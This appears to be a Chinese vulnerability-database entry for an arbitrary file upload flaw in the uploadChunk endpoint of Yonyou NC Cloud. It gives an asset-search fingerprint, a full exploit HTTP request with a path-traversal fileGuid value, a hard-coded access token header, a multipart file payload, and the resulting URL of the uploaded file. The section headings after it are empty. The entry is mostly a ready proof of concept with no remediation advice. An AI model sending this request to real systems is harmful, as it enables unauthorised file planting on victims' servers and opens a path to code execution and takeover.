# 用友NCclouduploadChunk存在任意文件上传

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 175`　`Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26f…`　`accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ`

**请求体 / payload**
```
--024ff46f71634a1c9bf8ec5820c26fa9
Content-Disposition: form-data; name="file"; filename=".Ivoz0.txt"
2WtGfBFl2S4GP9FkbK2x5Mg3Dci
--024ff46f71634a1c9bf8ec5820c26fa9--

上传文件位置
http://xx.xx.xx.xx/nccloud/.UYskJ.txt
```

**其他**
- 用友NC cloud uploadChunk 存在任意文件上传: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
  * 四、漏洞复现
***
- 版本: * 用友NC Cloud